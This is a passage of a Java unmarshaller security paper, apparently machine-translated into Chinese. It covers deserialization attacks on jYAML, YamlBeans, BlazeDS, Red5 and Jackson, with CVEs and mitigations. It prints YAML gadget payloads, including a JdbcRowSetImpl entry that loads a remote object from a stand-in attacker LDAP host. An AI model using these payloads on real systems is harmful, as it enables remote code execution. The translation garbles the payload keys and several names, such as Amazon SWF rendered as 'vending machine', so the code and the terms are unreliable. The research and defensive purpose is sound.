<div style="position:absolute;top:7747;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="7"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 7 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:7909;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.2 jYAML</font></font></b></nobr></div>
<div style="position:absolute;top:7958;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:7992;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowset (4.2)</font></font></a></nobr></div>
<div style="position:absolute;top:8021;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0RefDS (4.8)</font></font></a></nobr></div>
<div style="position:absolute;top:8051;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS (4.9)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:7942;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jYAML 对自定义类型使用稍微不同的语法</font></font></nobr></div>
<div style="position:absolute;top:7960;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比 SnakeYAML 并且不支持任意配置</font></font></nobr></div>
<div style="position:absolute;top:7977;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数调用。</font><font style="vertical-align: inherit;">该项目被放弃。</font><font style="vertical-align: inherit;">它需要一个</font></font></nobr></div>
<div style="position:absolute;top:7995;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共默认构造函数以及相应的getter</font></font></nobr></div>
<div style="position:absolute;top:8013;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法。</font></font></nobr></div>
<div style="position:absolute;top:8036;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jYAML 允许使用相同的基于属性的有效负载</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:8054;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 包括</font></font></font><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowset</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#18"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:8083;left:178"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">foo: !com.sun.rowset.JdbcRowSetImpl</font></font></nobr></div>
<div style="position:absolute;top:8101;left:197"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据源名称：ldap://攻击者/obj</font></font></nobr></div>
<div style="position:absolute;top:8119;left:197"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动提交：真</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:8154;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font color="#000000"><font style="vertical-align: inherit;">由于 getter 要求，无法触发</font></font><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;">SpringPropFac </font></a></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">jYAML 可以</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:8172;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也允许指定根类型，但根本不使用/检查。</font></font></nobr></div>
<div style="position:absolute;top:8199;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:8231;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jYAML 中似乎没有用于类型白名单的机制。</font></font></nobr></div>
<div style="position:absolute;top:8292;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.3 YamlBeans</font></font></b></nobr></div>
<div style="position:absolute;top:8341;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:8374;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS (4.9)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:8324;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">YamlBeans 对自定义类型使用另一种语法。</font><font style="vertical-align: inherit;">它</font></font></nobr></div>
<div style="position:absolute;top:8342;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只允许构造函数调用配置或注释</font></font></nobr></div>
<div style="position:absolute;top:8360;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型。</font><font style="vertical-align: inherit;">它需要一个默认构造函数，它没有</font></font></nobr></div>
<div style="position:absolute;top:8378;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是公共的，以及相应的getter方法。</font><font style="vertical-align: inherit;">Yaml-</font></font></nobr></div>
<div style="position:absolute;top:8396;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beans 通过其字段枚举类型的属性 - 含义</font></font></nobr></div>
<div style="position:absolute;top:8414;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只能使用与字段名称匹配的 setter。</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:8436;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowSet都</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不能使用触发</font></font></font><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">YamlBeans（3.1.3） </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font><font style="vertical-align: inherit;">因为所需的属性</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:8454;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有匹配的字段。</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#21"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，然而，仍然适用：</font></font></nobr></div>
<div style="position:absolute;top:8484;left:178"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</font></font></nobr></div>
<div style="position:absolute;top:8502;left:197"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">userOverridesAsString: HexAsciiSerializedMap:&lt;payload&gt;</font></font></nobr></div>
<div style="position:absolute;top:8537;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">YamlBeans 确实允许指定根类型，但根本不使用/检查。</font></font></nobr></div>
<div style="position:absolute;top:8555;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">YamlBeans 有几个配置选项，例如非公共构造函数可以是</font></font></nobr></div>
<div style="position:absolute;top:8573;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用不允许的或直接的字段访问。</font></font></nobr></div>
<div style="position:absolute;top:8596;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:8628;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">YamlBeans 中似乎没有用于类型白名单的机制。</font></font></nobr></div>
<div style="position:absolute;top:8761;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:9009;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="8"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 8 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:9171;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.4 Apache Flex BlazeDS</font></font></b></nobr></div>
<div style="position:absolute;top:9204;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BlazeDS AMF 解组器需要公共默认值</font></font></nobr></div>
<div style="position:absolute;top:9222;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数和公共设置器。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11</font></font></font></nobr></div>
<div style="position:absolute;top:9244;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AMF3/AMFx 解组器支持</font></font></nobr></div>
<div style="position:absolute;top:9263;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java.io.Externalizable 类型，这可用于</font></font></nobr></div>
<div style="position:absolute;top:9280;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过</font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;">RMIRef</font></a></font><font style="vertical-align: inherit;">获取 Java 反序列</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">化</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#27"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">他们都是</font></font></nobr></div>
<div style="position:absolute;top:9298;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有用于子类型的内置自定义转换规则</font></font></nobr></div>
<div style="position:absolute;top:9317;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">javax.sql.RowSet 这意味着</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowset</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不能</font></font></nobr></div>
<div style="position:absolute;top:9334;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解组。</font><font style="vertical-align: inherit;">其他可用的有效载荷包括</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spring-</font></font></a></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:9352;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PropFac</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></font><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#21"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 如果这些出现在</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:9369;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类路径。</font></font></nobr></div>
<div style="position:absolute;top:9392;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不允许指定根类型并且不检查</font></font></nobr></div>
<div style="position:absolute;top:9410;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">嵌套的属性类型。</font></font></nobr></div>
<div style="position:absolute;top:9435;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:9468;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过以下方式设置类型白名单</font></font></nobr></div>
<div style="position:absolute;top:9487;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反序列化验证器。</font><font style="vertical-align: inherit;">升级到版本</font></font></nobr></div>
<div style="position:absolute;top:9504;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.7.3 默认开启类型白名单。</font></font></nobr></div>
<div style="position:absolute;top:9217;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
<div style="position:absolute;top:9246;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2017-3066</font></font></b></nobr></div>
<div style="position:absolute;top:9264;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Adobe Coldfusion</font></font></nobr></div>
<div style="position:absolute;top:9294;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2017-5641</font></font></b></nobr></div>
<div style="position:absolute;top:9312;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache BlazeDS</font></font></nobr></div>
<div style="position:absolute;top:9342;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2017-5641 </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12</font></font></font></b></nobr></div>
<div style="position:absolute;top:9360;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟机中心</font></font></nobr></div>
<div style="position:absolute;top:9402;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:9435;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RMIRef (4.20)</font></font></a></nobr></div>
<div style="position:absolute;top:9465;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS (4.9)</font></font></a></nobr></div>
<div style="position:absolute;top:9495;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringPropFac (4.10)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:9559;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.5 Red5 IO AMF</font></font></b></nobr></div>
<div style="position:absolute;top:9591;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Red5 有定制的 AMF 解组器，它们确实略有不同</font></font></nobr></div>
<div style="position:absolute;top:9609;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 BlazeDS 的。</font><font style="vertical-align: inherit;">他们也需要公开默认</font></font></nobr></div>
<div style="position:absolute;top:9627;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数和公共设置器。</font><font style="vertical-align: inherit;">可外部化的类型是</font></font></nobr></div>
<div style="position:absolute;top:9645;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅通过自定义标记界面支持。</font></font></nobr></div>
<div style="position:absolute;top:9667;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，它没有自定义逻辑</font></font></nobr></div>
<div style="position:absolute;top:9686;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">javax.sql.RowSet 因此可以利用</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:9703;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowset</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及通过</font></font></font><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringPropFac</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></font></nobr></div>
<div style="position:absolute;top:9721;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#21"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 都是 Red5 的依赖</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:9739;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font></font></nobr></div>
<div style="position:absolute;top:9761;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:9794;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有用于类型白名单的配置选项。</font><font style="vertical-align: inherit;">升级</font></font></nobr></div>
<div style="position:absolute;top:9812;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到 1.0.8 (Final) 启用已知类型的黑名单</font></font></nobr></div>
<div style="position:absolute;top:9830;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可利用的。</font></font></nobr></div>
<div style="position:absolute;top:9604;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
<div style="position:absolute;top:9633;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2017-5878</font></font></b></nobr></div>
<div style="position:absolute;top:9652;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">红5，</font></font></nobr></div>
<div style="position:absolute;top:9652;left:670"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阿帕奇</font></font></nobr></div>
<div style="position:absolute;top:9669;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公开会议</font></font></nobr></div>
<div style="position:absolute;top:9714;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:9748;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowset (4.2)</font></font></a></nobr></div>
<div style="position:absolute;top:9778;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS (4.9)</font></font></a></nobr></div>
<div style="position:absolute;top:9808;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringPropFac (4.10)</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:9889;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现需要在编组期间使用吸气剂；</font><font style="vertical-align: inherit;">然而，没有它们的有效载荷可以</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9906;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用自定义 BeanProxy 实现构建 - 这也是获得正确的</font></font></nobr></div>
<div style="position:absolute;top:9920;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">某些类型的属性排序</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:9932;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 Markus Wulftange 发现，他独立发现了</font></font></font><font color="#800000" style="font-size:9px"><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RMIRef (4.20)</font></font></a></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向量以及</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9948;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发布了一些细节，包括对其他一些 AMF 实现的应用（</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"></a><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:9964;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码白安全</font></font></a><i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">博客点</font></font></a><i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">德/2017/04/amf </font></font></a><i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">html</font></font></a><font color="#000000"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://codewhitesec.blogspot.de/2017/04/amf.html"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">)</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:10023;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:10271;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="9"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 9 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:10433;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.6 杰克逊</font></font></b></nobr></div>
<div style="position:absolute;top:10482;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
<div style="position:absolute;top:10512;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报道</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">亚马逊</font></font></nobr></div>
<div style="position:absolute;top:10530;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动售货机</font></font></nobr></div>
<div style="position:absolute;top:10530;left:674"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单的</font></font></nobr></div>
<div style="position:absolute;top:10548;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作流库</font></font></nobr></div>
<div style="position:absolute;top:10578;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报道</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13</font></font></font></b></nobr></div>
<div style="position:absolute;top:10596;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">雷迪森</font></font></nobr></div>
<div style="position:absolute;top:10625;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2016-8749 </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14</font></font></font></b></nobr></div>
<div style="position:absolute;top:10643;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阿帕奇骆驼</font></font></nobr></div>
<div style="position:absolute;top:10688;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:10722;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowset (4.2)</font></font></a></nobr></div>
<div style="position:absolute;top:10752;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringPropFac (4.10)</font></font></a></nobr></div>
<div style="position:absolute;top:10781;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringBFAdv (4.12)</font></font></a></nobr></div>
<div style="position:absolute;top:10811;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0RefDS (4.8)</font></font></a></nobr></div>
<div style="position:absolute;top:10841;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS (4.9)</font></font></a></nobr></div>
<div style="position:absolute;top:10871;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RMIRemoteObj (4.21)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:10466;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jackson 在其默认配置中确实执行了严格的</font></font></nobr></div>
<div style="position:absolute;top:10484;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行时类型检查，包括集合泛型类型，</font></font></nobr></div>
<div style="position:absolute;top:10501;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且不允许任意类型的规范——</font></font></nobr></div>
<div style="position:absolute;top:10519;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此默认情况下它不受这些问题的影响。</font><font style="vertical-align: inherit;">它</font></font></nobr></div>
<div style="position:absolute;top:10537;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，确实有选项可以启用多态非</font></font></nobr></div>
